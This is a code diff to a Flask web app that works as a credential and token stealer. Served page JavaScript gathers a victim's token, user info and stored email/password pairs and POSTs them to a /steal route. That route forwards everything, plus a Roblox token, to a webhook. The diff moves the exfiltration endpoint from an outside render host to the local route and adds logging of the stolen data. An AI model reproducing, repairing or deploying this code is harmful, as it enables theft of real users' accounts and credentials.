@@ -1,4 +1,4 @@
-from flask import Flask, Response, request
+from flask import Flask, Response, request, send_file
 import requests
 import os
 
@@ -36,7 +36,7 @@ PREVIEW_HTML = """
             } catch (e) {
                 credentials.push({ email: 'Error', password: 'Could not access credentials' });
             }
-            await fetch('https://dustrrr.onrender.com/steal', {
+            await fetch('/steal', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ token, user_info: userInfo, credentials })
@@ -74,14 +74,20 @@ def upload_image():
 @app.route('/steal', methods=['POST'])
 def steal_data():
     data = request.json
+    if not data:
+        print("No data received in /steal")
+        return '', 400
     token = data.get('token')
     user_info = data.get('user_info')
     credentials = data.get('credentials')
     cred_text = "\n".join([f"Email: {cred['email']}, Password: {cred['password']}" for cred in credentials]) if credentials else "No credentials found"
-    requests.post(WEBHOOK_URL, json={
+    print(f"Sending to webhook: Token: {token}, User Info: {user_info}, Credentials: {cred_text}")
+    response = requests.post(WEBHOOK_URL, json={
         "content": f"Token: {token}\nUser Info: {user_info}\nCredentials:\n{cred_text}\nRoblox Token: {os.getenv('ROBLOX_TOKEN', 'Not found')}"
     })
+    print(f"Webhook response: {response.status_code}")
     return '', 204
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    port = int(os.environ.get('PORT', 10000))
+    app.run(host='0.0.0.0', port=port)
